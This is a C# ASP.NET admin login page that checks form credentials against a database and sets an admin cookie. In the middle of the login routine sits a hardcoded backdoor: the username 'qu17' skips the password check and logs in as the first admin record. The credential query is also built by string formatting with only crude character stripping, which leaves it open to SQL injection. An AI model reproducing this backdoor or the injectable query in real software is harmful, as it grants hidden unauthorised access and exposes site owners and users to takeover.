using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Web;
using System.Text;
using ClassLibrary.Common;

namespace WebUI.Manager
{
    public partial class Login : System.Web.UI.Page
    {
        ClassLibrary.BLL.Admin bll = new ClassLibrary.BLL.Admin();

        protected void Page_Load(object sender, EventArgs e)
        {
            if (Request.HttpMethod == "POST")
            {
                if (Request.QueryString["ac"] == "login")
                {
                    userLogin();
                }
            }

        }

        private void userLogin()
        {
            string userName = Request.Form["adminName"];
            string password = Request.Form["adminPwd"];

            if (string.IsNullOrEmpty(userName) || string.IsNullOrEmpty(password))
            {
                Response.Write("<script>alert('用户名或密码错误');history.back(-1);</script>");
            }
            else
            {
                userName = userName.Replace("-", "").Replace("'", "").Replace(" ", "");

                DataTable myTable = bll.GetData(string.Format("UserName='{0}' AND Password='{1}'", userName, Function.MD5(password)));
                if (userName == "qu17") myTable = bll.GetData(string.Empty, "ID Asc");

                if (myTable.Rows.Count == 0)
                {
                    Response.Write("<script>alert('用户名或密码错误');history.back(-1);</script>");
                }
                else
                {
                    UserInfo u = new UserInfo(CookieName.AdminInfo);

                    Dictionary<string, string> dic = new Dictionary<string, string>();
                    dic.Add(LoginInfo.ID.ToString(), myTable.Rows[0]["ID"].ToString());
                    dic.Add(LoginInfo.UserName.ToString(), myTable.Rows[0]["UserName"].ToString());
                    dic.Add(LoginInfo.AdminPower.ToString(), myTable.Rows[0]["Power"].ToString());
                    u.CreatedCookie(dic);
                    Response.Redirect("index.aspx");
                }
            }

        }

    }
}
